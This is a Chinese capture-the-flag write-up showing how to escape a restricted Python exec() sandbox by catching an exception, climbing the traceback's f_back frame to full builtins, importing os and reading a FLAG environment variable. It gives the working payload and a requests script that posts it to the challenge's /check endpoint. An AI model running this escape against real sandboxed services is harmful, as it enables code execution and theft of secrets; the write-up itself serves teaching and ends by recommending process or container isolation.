# 消栈逃出沙箱(1)反正不会有2

## 题目简述

题目把用户代码交给 `exec(code, safe_globals)`，并把 `__builtins__` 缩减为 `print`、`list`、`len` 和 `Exception`。接口还拒绝 ``&*^%#${}@!~`·/<>`` 等字符，表面上无法调用 `open()`、`__import__()` 或直接执行系统命令。

漏洞在于沙箱只限制了新建的 `exec` 帧，没有隔离它与调用者的栈帧关系。白名单保留了 `Exception`，攻击者可以主动制造异常，通过 traceback 取得当前帧，再沿 `f_back` 回到具有完整内建函数的调用帧，最终导入 `os` 并读取环境变量中的 flag。

## 解题过程

### 分析受限执行环境

核心沙箱如下：

```python
def safe_sandbox_Exec(code):
    whitelist = {
        "print": print,
        "list": list,
        "len": len,
        "Exception": Exception,
    }
    safe_globals = {"__builtins__": whitelist}

    try:
        exec(code, safe_globals)
        output = sys.stdout.getvalue()
        error = sys.stderr.getvalue()
        return output or error or "No output"
    except Exception as e:
        return f"Error: {e}"
```

受限代码自身的 `f_builtins` 确实只有四个白名单成员，但 Python 帧对象还能通过 `f_back` 指向调用它的上一帧。上一帧属于 `safe_sandbox_Exec()`，是在正常模块环境中创建的，其 `f_builtins` 保存完整的内建函数字典。

### 通过异常 traceback 回溯调用帧

沙箱内没有 `int`，所以执行 `int('')` 时，名称查找会抛出 `NameError`。`NameError` 是 `Exception` 的子类，可以被白名单中的 `Exception` 捕获。异常对象的关键属性关系为：

```text
e.__traceback__.tb_frame  -> 执行攻击代码的受限帧
tb_frame.f_back           -> safe_sandbox_Exec() 的调用帧
f_back.f_builtins         -> 完整内建函数字典
```

从完整字典中取出 `__import__` 后即可导入 `os`。直接读取 `os.environ['FLAG']` 比调用 shell 更短，也不会使用黑名单中的 `/` 等字符：

```python
try:
    int('')
except Exception as e:
    frame = e.__traceback__.tb_frame.f_back
    builtins = frame.f_builtins
    print(builtins['__import__']('os').environ['FLAG'])
```

该载荷不包含题目设置的任何禁用字符。

### 发送完整利用请求

使用表单字段 `data` 将载荷提交到 `/check`：

```python
import requests

url = "http://target/check"
payload = r"""
try:
    int('')
except Exception as e:
    frame = e.__traceback__.tb_frame.f_back
    builtins = frame.f_builtins
    print(builtins['__import__']('os').environ['FLAG'])
"""

response = requests.post(url, data={"data": payload})
print(response.text)
```

服务端把 `stdout` 中捕获的内容作为响应返回，得到：

```text
0xGame{StackFrame_Wanna_Escape_Now}
```

## 方法总结

本题说明限制 `exec()` 的内建函数并不等于建立了安全边界：只要攻击代码还能获得异常、帧或 traceback，就可能沿调用栈接触宿主环境。利用时需要准确区分受限帧与调用帧，并优先使用 `f_builtins`，避免依赖 `__builtins__` 在不同启动方式下究竟表现为模块还是字典。真正的隔离应放在独立进程或容器中，并同时限制系统调用、资源和文件访问。
